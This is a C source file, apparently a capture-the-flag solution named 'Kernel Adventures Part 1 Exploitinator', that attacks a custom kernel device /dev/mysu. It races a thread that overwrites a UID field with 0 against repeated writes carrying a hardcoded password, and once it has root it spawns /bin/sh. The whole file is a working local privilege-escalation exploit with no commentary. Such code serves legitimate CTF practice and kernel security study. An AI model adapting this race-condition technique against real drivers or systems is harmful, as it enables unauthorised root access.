#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <stdbool.h>
#include <pthread.h>

int mysu_fd;
uint32_t target_uid = 0;
uint32_t known_uid = 1000;
unsigned char known_password[] = {0x6e, 0x63, 0x7b, 0x89, 0x0, 0x0, 0x0, 0x0};

unsigned char* payload;
bool stop = 0;

void* inject_target_uid() {
    while (!stop) {
        memcpy(payload, &target_uid, sizeof(target_uid));
    }

    return NULL;
}

int main() {
    printf("Kernel Adventures Part 1 Exploitinator\n");

    mysu_fd = open("/dev/mysu", O_RDWR);
    if (mysu_fd == -1) {
        printf("Failed to open '/dev/mysu'\n");
        exit(1);
    }

    payload = mmap(0, sizeof(known_uid) + sizeof(known_password) + 1, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    memcpy(payload, &known_uid, sizeof(known_uid));
    memcpy(payload + sizeof(known_uid), known_password, sizeof(known_password));

    pthread_t injector_tid;
    pthread_create(&injector_tid, NULL, inject_target_uid, NULL); 

    while (getuid() != 0) {
        memcpy(payload, &known_uid, sizeof(known_uid));
        write(mysu_fd, payload, sizeof(known_uid) + sizeof(known_password) + 1);
    }
    stop = 1;

    printf("Escalated!\n");

    pthread_join(injector_tid, NULL);

    printf("Your shell, my liege\n");
    system("/bin/sh");

    return 0;
}
